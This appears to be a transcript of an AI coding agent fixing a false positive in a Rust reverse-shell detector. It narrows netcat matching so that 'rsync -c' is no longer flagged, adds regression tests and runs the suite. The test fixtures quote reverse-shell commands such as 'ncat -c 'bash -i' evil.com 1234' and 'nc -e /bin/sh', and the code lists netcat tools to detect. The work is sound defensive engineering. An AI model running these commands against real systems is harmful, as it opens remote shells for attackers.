@@ -1,0 +1,142 @@
+  yoyo (piped mode) — model: claude-opus-4-8
+  👀 Auto-watch: `cargo clippy --all-targets -- -D warnings && cargo test` (disable with auto_watch = false)
+
+Let me start by examining the reverse-shell check in safety.rs.
+  ▶ search 'nc |netcat|is_at_word_boundary|reverse.shell' in src/safety.rs ✓ (3ms)
+  ▶ search 'netcat|word_boundary|reverse' in src/safety.rs ✓ (3ms)
+  ▶ search 'ncat|shell|boundary' in src/safety.rs ✓ (3ms)
+  3 tools completed in 8.1s (3 ✓)
+
+The check may not exist yet. Let me look at the file structure.
+  ╭─ Turn 4 ─────────────────────────────────────────────────────────────╮
+  ▶ $ wc -l src/safety.rs; grep -n "nc\|fn \|word\|boundary" src/safety.rs | head -60 ✓ (8ms)
+
+No reverse-shell check currently exists. Let me look at the CHECKS list and the `is_at_word_boundary` helper closely.
+  ╭─ Turn 5 ─────────────────────────────────────────────────────────────╮
+  ▶ read src/safety.rs:40..175 ✓ (1ms)
+
+`check_reverse_shell` does exist (line 57 in the list). Let me find its definition.
+  ╭─ Turn 6 ─────────────────────────────────────────────────────────────╮
+  ▶ $ grep -n "fn check_reverse_shell" src/safety.rs📦 RTK detected — using compressed output (disable with --no-rtk)
+ ✓ (13ms)
+  ▶ read src/safety.rs:925..995 ✓ (1ms)
+  2 tools completed in 7.4s (2 ✓)
+
+Now I understand the bug. `nc_tools = ["nc ", "ncat ", "netcat "] uses contains() with a trailing space but no leading word boundary. So rsync -c foo bar matches: "nc " appears in rsync `... wait, "rsync " → "nc " does appear (ryn**c** ... let me check: rsync  = r,s,y,n,c,space → substring "nc " = n,c,space → yes matches). And -c is present → false flag.
+
+Let me write a failing test first, then fix. Let me check the existing tests for reverse shell.
+  ╭─ Turn 8 ─────────────────────────────────────────────────────────────╮
+  ▶ $ grep -n "reverse_shell\|check_reverse\|nc -e\|rsync" src/safety.rs | head ✓ (4ms)
+  ▶ read src/safety.rs:1725..1765 ✓ (1ms)
+  2 tools completed in 5.2s (2 ✓)
+
+Now let me add the failing near-miss tests first, then fix the check. Let me add tests:
+  ╭─ Turn 10 ────────────────────────────────────────────────────────────╮
+  ▶ edit src/safety.rs (3 → 24 lines)
+            // Safe: normal nc usage (no -e/-c)
+            assert!(analyze_bash_command("nc -zv localhost 8080").is_none());
+  +         // Positive with -c flag: bare ncat with -c is still a reverse shell
+  +         assert!(analyze_bash_command("ncat -c 'bash -i' evil.com 1234").is_some());
+  +     }
+  + 
+  +     #[test]
+  +     fn test_reverse_shell_word_boundary_no_false_positive() {
+  +         // Regression for #578: "nc " must not match inside "rsync ". The old
+  +         // substring check flagged `rsync -c foo bar` because "rsync " contains
+  +         // "nc " and "-c" satisfied the flag requirement. `nc`/`ncat`/`netcat`
+  +         // must only match as standalone command tokens.
+  +         assert!(
+  +             analyze_bash_command("rsync -c foo bar").is_none(),
+  +             "rsync -c should NOT be flagged as a reverse shell"
+  +         );
+  +         // More innocent near-misses that previously would trip the substring:
+  +         assert!(analyze_bash_command("rsync -e ssh src dst").is_none());
+  +         assert!(analyze_bash_command("./configure -c && make").is_none());
+  +         assert!(analyze_bash_command("franchise -e list").is_none());
+  ... (4 more lines)
+ ✓ (1m 32s)
+            // Safe: normal nc usage (no -e/-c)
+            assert!(analyze_bash_command("nc -zv localhost 8080").is_none());
+  +         // Positive with -c flag: bare ncat with -c is still a reverse shell
+  +         assert!(analyze_bash_command("ncat -c 'bash -i' evil.com 1234").is_some());
+  +     }
+  + 
+  +     #[test]
+  +     fn test_reverse_shell_word_boundary_no_false_positive() {
+  ... (13 more lines)
+
+Tests added. Now let's confirm the new tests fail with current code, then fix. Now apply the fix using word-boundary matching:
+  ╭─ Turn 11 ────────────────────────────────────────────────────────────╮
+  ▶ edit src/safety.rs (10 → 22 lines)
+  -     // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute)
+  -     let nc_tools = ["nc ", "ncat ", "netcat "];
+  -     for tool in &nc_tools {
+  -         if cmd_lower.contains(tool) && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ")) {
+  -             return Some(format!(
+  -                 "Reverse shell: {} with -e/-c flag can execute commands on a remote connection",
+  -                 tool.trim_end(),
+  -             ));
+  +     // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute).
+  +     // Match the tool name only as a standalone command token (word boundary
+  +     // before it) so that harmless commands like `rsync -c foo bar` — where
+  +     // "nc " appears inside "rsync " — are not flagged (#578).
+  +     let nc_tools = ["nc", "ncat", "netcat"];
+  +     let has_exec_flag = cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ");
+  +     if has_exec_flag {
+  +         for tool in &nc_tools {
+  +             let mut search_from = 0;
+  +             // Look for "<tool> " so the tool name is a whole token followed by an arg.
+  +             let needle = format!("{tool} ");
+  +             while let Some(pos) = cmd_lower[search_from..].find(&needle) {
+  ... (10 more lines)
+ ✓ (1m 41s)
+  -     // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute)
+  -     let nc_tools = ["nc ", "ncat ", "netcat "];
+  -     for tool in &nc_tools {
+  -         if cmd_lower.contains(tool) && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ")) {
+  -             return Some(format!(
+  -                 "Reverse shell: {} with -e/-c flag can execute commands on a remote connection",
+  -                 tool.trim_end(),
+  -             ));
+  ... (13 more lines)
+
+Now `is_at_word_boundary includes / as a boundary, so /usr/bin/nc -e ...` still catches. Let me run the full checks.
+  ╭─ Turn 12 ────────────────────────────────────────────────────────────╮
+  ▶ $ cargo fmt && cargo clippy --all-targets -- -D warnings 2>&1 | tail -5 && cargo t… ✓ (18.2s)
+
+No lib target; tests are in the binary. Let me run properly.
+  ╭─ Turn 13 ────────────────────────────────────────────────────────────╮
+  ▶ $ cargo test safety 2>&1 | tail -25 ✓ (157ms)
+
+All safety tests pass. Let me run the full test suite and build to be sure.
+  ╭─ Turn 14 ────────────────────────────────────────────────────────────╮
+  ▶ $ cargo build 2>&1 | tail -3 && cargo test 2>&1 | tail -8 ✓ (57.3s)
+
+All green. Let me verify the fix behaves correctly with a quick sanity check by confirming the near-miss and positive cases via a tiny test run already covered. Let me also double check clippy is clean fully.
+  ╭─ Turn 15 ────────────────────────────────────────────────────────────╮
+  ▶ $ cargo clippy --all-targets -- -D warnings 2>&1 | tail -3 ✓ (16.6s)
+
+Everything green. Let me commit.
+  ╭─ Turn 16 ────────────────────────────────────────────────────────────╮
+  ▶ $ cd /home/runner/work/yoyo-evolve/yoyo-evolve && git add -A && git commit -m "Day… ✓ (15ms)
+
+Committed. 
+
+## Summary
+
+Fixed the reverse-shell false positive in src/safety.rs (#578).
+
+The bug: check_reverse_shell matched ["nc ", "ncat ", "netcat "] as bare substrings. `rsync  contains the substring nc  (from "rsy**nc **"), and rsync -c foo bar` supplies the -c flag the check also looks for — so a routine rsync got flagged as a reverse shell. A real product footgun for any user.
+
+The fix: Reworked the netcat check to match nc/ncat/netcat only as standalone command tokens, reusing the existing `is_at_word_boundary helper (which treats whitespace, ;, |, &, (, and /` as boundaries — so full-path invocations like /usr/bin/nc -e ... still catch). Scans all occurrences with a char-boundary-safe `find` loop; no byte-slicing at arbitrary offsets.
+
+**Tests (Day 122 discipline — verify the silent side):**
+• Positive still flags: nc -e /bin/sh, `ncat -c 'bash -i', cd /tmp; nc -e ..., foo | netcat -e ...`
+• Near-misses that must NOT flag: rsync -c foo bar (the reported bug), rsync -e ssh src dst, `./configure -c && make, franchise -e list`
+
+All checks green: cargo build, cargo test (88 passed), `cargo clippy --all-targets -- -D warnings`.
+
+Issue response and close happen in Phase C.
+
+  watch: no files changed this turn — skipping
+
